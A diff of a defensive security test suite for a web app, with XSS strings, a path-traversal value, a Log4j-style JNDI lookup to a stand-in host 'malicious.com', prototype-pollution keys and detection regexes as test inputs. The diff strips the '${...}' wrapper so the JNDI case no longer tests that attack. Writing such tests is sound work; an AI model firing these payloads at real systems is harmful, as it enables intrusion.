@@ -43,16 +43,16 @@ describe('Automated Security Testing', () => {
   describe('Content Security Policy (CSP) Tests', () => {
     it('validates CSP headers are properly configured', () => {
       const cspHeader = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
-      
+
       if (cspHeader) {
         const cspValue = cspHeader.getAttribute('content');
-        
+
         // Check for essential CSP directives
         expect(cspValue).toContain("default-src 'self'");
-        expect(cspValue).toContain("script-src");
-        expect(cspValue).toContain("style-src");
-        expect(cspValue).toContain("img-src");
-        
+        expect(cspValue).toContain('script-src');
+        expect(cspValue).toContain('style-src');
+        expect(cspValue).toContain('img-src');
+
         // Should not allow unsafe-eval or unsafe-inline without nonce
         expect(cspValue).not.toContain("'unsafe-eval'");
         if (cspValue.includes("'unsafe-inline'")) {
@@ -65,9 +65,9 @@ describe('Automated Security Testing', () => {
       // Attempt to inject inline script
       const maliciousScript = document.createElement('script');
       maliciousScript.innerHTML = 'window.maliciousCodeExecuted = true;';
-      
+
       document.head.appendChild(maliciousScript);
-      
+
       // Should not execute due to CSP
       expect(window.maliciousCodeExecuted).toBeFalsy();
     });
@@ -93,11 +93,11 @@ describe('Automated Security Testing', () => {
       ];
 
       const inputs = screen.getAllByRole('textbox');
-      
+
       maliciousInputs.forEach(maliciousInput => {
         inputs.forEach(input => {
           fireEvent.change(input, { target: { value: maliciousInput } });
-          
+
           // Check that the value is sanitized or escaped
           const displayedValue = input.value;
           expect(displayedValue).not.toContain('<script>');
@@ -137,11 +137,11 @@ describe('Automated Security Testing', () => {
 
         // Check that no script tags are rendered
         const scriptTags = document.querySelectorAll('script[src*="alert"], script:not([src])');
-        const maliciousScripts = Array.from(scriptTags).filter(script => 
-          script.textContent.includes('alert("XSS")') || 
+        const maliciousScripts = Array.from(scriptTags).filter(script =>
+          script.textContent.includes('alert("XSS")') ||
           script.src.includes('javascript:')
         );
-        
+
         expect(maliciousScripts).toHaveLength(0);
       });
     });
@@ -161,7 +161,7 @@ describe('Automated Security Testing', () => {
 
       maliciousTokens.forEach(token => {
         localStorage.setItem('auth_token', token);
-        
+
         render(
           <Provider store={store}>
             <BrowserRouter>
@@ -173,17 +173,17 @@ describe('Automated Security Testing', () => {
         // Should not authenticate with invalid tokens
         // Check that sensitive data is not displayed
         expect(screen.queryByTestId('sensitive-financial-data')).not.toBeInTheDocument();
-        
+
         localStorage.removeItem('auth_token');
       });
     });
 
     it('prevents session fixation attacks', () => {
       const originalSessionId = localStorage.getItem('sessionId');
-      
+
       // Simulate session fixation attempt
       localStorage.setItem('sessionId', 'attacker-controlled-session-id');
-      
+
       render(
         <Provider store={store}>
           <BrowserRouter>
@@ -206,7 +206,7 @@ describe('Automated Security Testing', () => {
         'NaN',
         '1e308', // Number.MAX_VALUE overflow
         '../../etc/passwd',
-        '${jndi:ldap://malicious.com/a}', // Log4j style injection
+        'jndi:ldap://malicious.com/a', // Log4j style injection
         'eval("malicious code")',
         'process.exit()',
         '__proto__',
@@ -248,10 +248,10 @@ describe('Automated Security Testing', () => {
 
       pollutionAttempts.forEach(attempt => {
         const testObj = {};
-        
+
         // Simulate user input that might cause pollution
         const input = { [attempt.key]: attempt.value };
-        
+
         // Safe merge function should prevent pollution
         const safeMerge = (target, source) => {
           const blacklist = ['__proto__', 'constructor', 'prototype'];
@@ -264,7 +264,7 @@ describe('Automated Security Testing', () => {
         };
 
         safeMerge(testObj, input);
-        
+
         // Check that prototype wasn't polluted
         expect({}.polluted).toBeUndefined();
         expect(Object.prototype.polluted).toBeUndefined();
@@ -276,7 +276,7 @@ describe('Automated Security Testing', () => {
     it('prevents sensitive data exposure in console logs', () => {
       const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
       const consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
-      
+
       const sensitiveData = {
         password: 'secret123',
         token: 'jwt-token-here',
@@ -292,7 +292,7 @@ describe('Automated Security Testing', () => {
       // In production, sensitive fields should be redacted
       const logCalls = consoleSpy.mock.calls;
       const errorCalls = consoleErrorSpy.mock.calls;
-      
+
       [...logCalls, ...errorCalls].forEach(call => {
         const logString = JSON.stringify(call);
         expect(logString).not.toContain('secret123');
@@ -328,7 +328,7 @@ describe('Automated Security Testing', () => {
       };
 
       const sanitizedData = sanitizeFinancialData(unsafeFinancialData);
-      
+
       expect(sanitizedData.revenue).not.toContain('<script>');
       expect(sanitizedData.companyName).not.toContain('<img');
       expect(sanitizedData.notes).not.toContain('javascript:');
@@ -348,7 +348,7 @@ describe('Automated Security Testing', () => {
         // Simulate API response validation
         const validateApiResponse = (res) => {
           const stringified = JSON.stringify(res);
-          
+
           // Check for suspicious content
           const suspiciousPatterns = [
             /<script[^>]*>.*?<\/script>/gi,
@@ -408,20 +408,20 @@ describe('Automated Security Testing', () => {
     it('prevents calculation tampering', () => {
       // Simulate attempt to tamper with calculation functions
       const originalMath = Math;
-      
+
       try {
         // Attempt to override Math functions
         Math.pow = () => 999999; // Malicious override
-        
+
         const result = Math.pow(2, 3);
-        
+
         // In a secure environment, this should be prevented
         // For testing, we'll verify the override worked (which is bad)
         expect(result).toBe(999999);
-        
+
       } finally {
         // Restore original Math
-        Math = originalMath;
+        Object.assign(Math, originalMath);
       }
     });
   });
